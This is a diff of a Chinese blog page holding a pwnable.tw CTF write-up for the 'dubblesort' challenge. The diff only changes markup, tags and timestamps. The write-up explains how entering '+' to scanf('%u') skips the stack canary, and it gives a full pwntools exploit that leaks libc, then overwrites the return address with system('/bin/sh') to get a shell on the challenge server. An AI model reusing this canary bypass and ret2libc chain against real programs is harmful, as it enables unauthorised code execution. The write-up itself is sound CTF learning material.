@@ -20,20 +20,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="学习与收获对于scanf(&quot;%u&quot;,v4)，%u表示无符号整数  当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中； 当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据； 当我们输入+或者-时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为+和-也可以用来定义数字的正负，所以_sc">
+  <meta name="description" content="学习与收获对于scanf(&quot;%u&quot;,v4)，%u表示无符号整数  当我们输入整数时，scanf认为其是合法字符，并将其写到v4中； 当我们输入字母时，scanf认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据； 当我们输入+或者-时，scanf会认为他是合法字符，同时又不会将其写到v4中。（因为+和-也可以用来定义数字的正负，所以scanf会认为其是合法的">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnable.tw writeup-dubblsort">
 <meta property="og:url" content="http://example.com/2025/01/20/dubblsort/index.html">
 <meta property="og:site_name" content="Qwen&#39;s blog">
-<meta property="og:description" content="学习与收获对于scanf(&quot;%u&quot;,v4)，%u表示无符号整数  当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中； 当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据； 当我们输入+或者-时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为+和-也可以用来定义数字的正负，所以_sc">
+<meta property="og:description" content="学习与收获对于scanf(&quot;%u&quot;,v4)，%u表示无符号整数  当我们输入整数时，scanf认为其是合法字符，并将其写到v4中； 当我们输入字母时，scanf认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据； 当我们输入+或者-时，scanf会认为他是合法字符，同时又不会将其写到v4中。（因为+和-也可以用来定义数字的正负，所以scanf会认为其是合法的">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237767.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237403.png">
 <meta property="article:published_time" content="2025-01-20T14:37:06.000Z">
-<meta property="article:modified_time" content="2025-01-20T15:00:43.173Z">
+<meta property="article:modified_time" content="2025-01-20T15:22:57.792Z">
 <meta property="article:author" content="Qwen">
-<meta property="article:tag" content="pwn 栈">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="栈">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png">
 
@@ -189,7 +190,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2025-01-20 22:37:06 / 修改时间：23:00:43" itemprop="dateCreated datePublished" datetime="2025-01-20T22:37:06+08:00">2025-01-20</time>
+              <time title="创建时间：2025-01-20 22:37:06 / 修改时间：23:22:57" itemprop="dateCreated datePublished" datetime="2025-01-20T22:37:06+08:00">2025-01-20</time>
             </span>
 
           
@@ -212,27 +213,27 @@
       
         <h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><p>对于<code>scanf(&quot;%u&quot;,v4)</code>，<code>%u</code>表示无符号整数</p>
 <ul>
-<li>当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中；</li>
-<li>当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
-<li>当我们输入<code>+</code>或者<code>-</code>时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以_scanf_会认为其是合法的）</li>
+<li>当我们输入整数时，<em>scanf</em>认为其是合法字符，并将其写到<em>v4</em>中；</li>
+<li>当我们输入字母时，<em>scanf</em>认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
+<li>当我们输入<code>+</code>或者<code>-</code>时，<em>scanf</em>会认为他是合法字符，同时又不会将其写到<em>v4</em>中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以<em>scanf</em>会认为其是合法的）</li>
 </ul>
-<p>有些时候我们可以利用_scanf_的这个漏洞，达到绕过_canary_的目的。</p>
+<p>有些时候我们可以利用<em>scanf</em>的这个漏洞，达到绕过<em>canary</em>的目的。</p>
 <h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>保护：</p>
 <p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png" alt="1"></p>
-<p>第一次_read_往_buf_写入<code>0x40</code>个字节，接着输入一个整数到_v8_，然后输入数据到栈中，这个过程循环_v8_次</p>
+<p>第一次<em>read</em>往<em>buf</em>写入<code>0x40</code>个字节，接着输入一个整数到<em>v8</em>，然后输入数据到栈中，这个过程循环<em>v8</em>次</p>
 <p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237767.png" alt="2"></p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	在循环的过程中，每循环一次，往栈上输入数据的位置就<code>+1</code>，也就是说我们可以覆盖返回地址，但是同时也会覆盖_canary_。而我们又没办法泄漏_canary_，那能不能绕过修改_canary_的这一次循环呢？</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	在循环的过程中，每循环一次，往栈上输入数据的位置就<code>+1</code>，也就是说我们可以覆盖返回地址，但是同时也会覆盖<em>canary</em>。而我们又没办法泄漏<em>canary</em>，那能不能绕过修改<em>canary</em>的这一次循环呢？</p>
 <p>对于<code>scanf(&quot;%u&quot;,v4)</code>，</p>
 <ul>
-<li>当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中；</li>
-<li>当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
-<li>当我们输入<code>+</code>或者<code>-</code>时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以_scanf_会认为其是合法的）</li>
+<li>当我们输入整数时，<em>scanf</em>认为其是合法字符，并将其写到<em>v4</em>中；</li>
+<li>当我们输入字母时，<em>scanf</em>认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
+<li>当我们输入<code>+</code>或者<code>-</code>时，<em>scanf</em>会认为他是合法字符，同时又不会将其写到<em>v4</em>中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以<em>scanf</em>会认为其是合法的）</li>
 </ul>
-<p>​	也就是说，假如_i&#x3D;11_时，我们该写入到_canary_这个位置，此时如果输入<code>+</code>，便能成功绕过_canary_。然后_i_也成功<code>+1</code>，接下来我们直接覆盖返回导致即可。</p>
+<p>​	也就是说，假如<em>i&#x3D;11</em>时，我们该写入到<em>canary</em>这个位置，此时如果输入<code>+</code>，便能成功绕过<em>canary</em>。然后<em>i</em>也成功<code>+1</code>，接下来我们直接覆盖返回导致即可。</p>
 <p>整体思路如下，</p>
 <ol>
-<li>计算偏移量，泄漏一个_libc_地址，算出_libc_基地址</li>
-<li>绕过_canary_，覆盖返回地址</li>
+<li>计算偏移量，泄漏一个<em>libc</em>地址，算出<em>libc</em>基地址</li>
+<li>绕过<em>canary</em>，覆盖返回地址</li>
 </ol>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line">debug(p)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">libc_base = leak-<span class="number">0x1b000a</span>   <span class="comment">#本地的offset是0x1840a</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;sort :&quot;</span>,<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="built_in">str</span>(system))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -247,7 +248,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/pwn-%E6%A0%88/" rel="tag"># pwn 栈</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%A0%88/" rel="tag"># 栈</a>
           </div>
 
         
@@ -350,7 +352,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
